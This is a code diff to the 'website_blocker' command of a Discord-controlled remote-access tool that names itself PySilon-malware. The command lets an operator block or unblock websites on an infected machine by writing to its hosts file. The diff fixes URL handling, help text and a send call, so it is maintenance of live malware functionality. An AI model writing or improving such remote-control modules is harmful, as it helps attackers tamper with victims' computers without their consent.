@@ -15,8 +15,8 @@ async def website_blocker(ctx, option=None, website=None):
     if option == "block":
         if website != None:
             if not website.startswith("https://") or not website.startswith("http://"):
-                website = website.replace("https://", "")
-                website = website.replace("http://", "")
+                website = "http://" + website 
+            print(website)
             parsed_url = urlparse(website)
             host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
             hosts_file_path = get_hosts_file_path()
@@ -24,7 +24,7 @@ async def website_blocker(ctx, option=None, website=None):
             if hosts_file_path:
                 with open(hosts_file_path, 'a') as hosts_file:
                     hosts_file.write(host_entry)
-                embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. Unblock it by using website unblock [websiteurl]```', colour=discord.Colour.green())
+                embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. \nUnblock it by using .website unblock [websiteurl]```', colour=discord.Colour.green())
                 embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                 await ctx.send(embed=embed)
 
@@ -35,13 +35,12 @@ async def website_blocker(ctx, option=None, website=None):
         else:
             embed = discord.Embed(title="🔴 Hold on!", description=f'```Syntax: .website block <https://example.com>```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            await message.channel.send(embed=embed)
+            await ctx.send(embed=embed)
 
     elif option == "unblock":
         if website != None:
-            if not website.startswith("https://") or not website.startswith("http://"):
-                website = website.replace("https://", "")
-                website = website.replace("http://", "")
+            website = website.replace("https://", "")
+            website = website.replace("http://", "")
             hosts_file_path = get_hosts_file_path()
             if hosts_file_path:
                 with open(hosts_file_path, 'r') as hosts_file:
